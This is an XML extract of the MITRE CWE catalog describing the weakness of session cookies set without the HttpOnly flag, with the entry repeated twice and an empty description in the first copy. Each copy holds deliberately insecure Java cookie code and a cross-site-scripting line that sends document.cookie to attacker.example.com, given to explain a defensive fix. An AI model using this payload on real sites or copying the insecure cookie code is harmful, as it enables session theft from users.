<?xml version="1.0" encoding="UTF-8"?>

<Weakness_Catalog Catalog_Name="CWE" Catalog_Version="2.12" Catalog_Date="2017-11-08"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:noNamespaceSchemaLocation="http://cwe.mitre.org/data/xsd/cwe_schema_v5.4.4.xsd"
	xmlns:capec="http://capec.mitre.org/capec-2">
      <Weakness ID="1005" Name="Sensitive Cookie Without 'HttpOnly' Flag"
                Weakness_Abstraction="Variant"
                Status="Incomplete">
         <Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>442</Relationship_Target_ID>
			<!--Web Problems-->
		</Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>732</Relationship_Target_ID>
			<!--Incorrect Permission Assignment for Critical Resource-->
		</Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-Independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Web-based"/>
            </Architectural_Paradigms>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web Server"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.</Text>
            </Background_Detail>
         </Background_Details>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Leverage the HttpOnly flag when setting a sensitive cookie in a response.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies.</Text>
                  <Text>Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text>
               <Example_Body>
                  <Text>The snippet of code below establishes a new cookie to hold the sessionID.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String sessionID = generateSessionId();</Code>
                     <Code>Cookie c = new Cookie("session_id", sessionID);</Code>
                     <Code>response.addCookie(c);</Code>
                  </Block>
                  <Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>Javascript</Code_Example_Language>
                     <Code>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</Code>
                  </Block>
                  <Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Text>
                  <Text>To mitigate the risk, use the setHttpOnly(true) method.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String sessionID = generateSessionId();</Code>
                     <Code>Cookie c = new Cookie("session_id", sessionID);</Code>
                     <Code>c.setHttpOnly(true);</Code>
                     <Code>response.addCookie(c);</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2014-3852</Observed_Example_Reference>
               <Observed_Example_Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3852</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2015-4138</Observed_Example_Reference>
               <Observed_Example_Description>Appliance for managing encrypted communications does not use HttpOnly flag.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.1004.1">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>HttpOnly</Reference_Title>
               <Reference_Link>https://www.owasp.org/index.php/HttpOnly</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Some Bad News and Some Good News</Reference_Title>
               <Reference_PubDate>2002</Reference_PubDate>
               <Reference_Link>https://msdn.microsoft.com/en-us/library/ms972826.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.3">
               <Reference_Author>Troy Hunt</Reference_Author>
               <Reference_Title>C is for cookie, H is for hacker - understanding HTTP only and Secure cookies</Reference_Title>
               <Reference_PubDate>2013-03-26</Reference_PubDate>
               <Reference_Link>https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.4">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Reference_Title>
               <Reference_Link>https://msdn.microsoft.com/en-us/library/ms533046.aspx</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2017-01-02</Submission_Date>
            </Submission>
				<Modification Modification_Source="Internal">
					<Modifier>CWE Content Team</Modifier>
					<Modifier_Organization>MITRE</Modifier_Organization>
					<Modification_Date>2017-11-08</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="1004" Name="Sensitive Cookie Without 'HttpOnly' Flag"
                Weakness_Abstraction="Variant"
                Status="Incomplete">
         <Description>
            <Description_Summary>The software uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.</Description_Summary>
            <Extended_Description>
               <Text>The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>442</Relationship_Target_ID>
			<!--Web Problems-->
		</Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>732</Relationship_Target_ID>
			<!--Incorrect Permission Assignment for Critical Resource-->
		</Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-Independent"/>
            </Languages>
            <Architectural_Paradigms>
               <Architectural_Paradigm Architectural_Paradigm_Name="Web-based"/>
            </Architectural_Paradigms>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web Server"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details.</Text>
            </Background_Detail>
         </Background_Details>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Leverage the HttpOnly flag when setting a sensitive cookie in a response.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies.</Text>
                  <Text>Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text>
               <Example_Body>
                  <Text>The snippet of code below establishes a new cookie to hold the sessionID.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String sessionID = generateSessionId();</Code>
                     <Code>Cookie c = new Cookie("session_id", sessionID);</Code>
                     <Code>response.addCookie(c);</Code>
                  </Block>
                  <Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>Javascript</Code_Example_Language>
                     <Code>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</Code>
                  </Block>
                  <Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Text>
                  <Text>To mitigate the risk, use the setHttpOnly(true) method.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String sessionID = generateSessionId();</Code>
                     <Code>Cookie c = new Cookie("session_id", sessionID);</Code>
                     <Code>c.setHttpOnly(true);</Code>
                     <Code>response.addCookie(c);</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2014-3852</Observed_Example_Reference>
               <Observed_Example_Description>CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.</Observed_Example_Description>
               <Observed_Example_Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3852</Observed_Example_Link>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2015-4138</Observed_Example_Reference>
               <Observed_Example_Description>Appliance for managing encrypted communications does not use HttpOnly flag.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.1004.1">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>HttpOnly</Reference_Title>
               <Reference_Link>https://www.owasp.org/index.php/HttpOnly</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Some Bad News and Some Good News</Reference_Title>
               <Reference_PubDate>2002</Reference_PubDate>
               <Reference_Link>https://msdn.microsoft.com/en-us/library/ms972826.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.3">
               <Reference_Author>Troy Hunt</Reference_Author>
               <Reference_Title>C is for cookie, H is for hacker - understanding HTTP only and Secure cookies</Reference_Title>
               <Reference_PubDate>2013-03-26</Reference_PubDate>
               <Reference_Link>https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.1004.4">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Reference_Title>
               <Reference_Link>https://msdn.microsoft.com/en-us/library/ms533046.aspx</Reference_Link>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2017-01-02</Submission_Date>
            </Submission>
				<Modification Modification_Source="Internal">
					<Modifier>CWE Content Team</Modifier>
					<Modifier_Organization>MITRE</Modifier_Organization>
					<Modification_Date>2017-11-08</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, References, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
</Weakness_Catalog>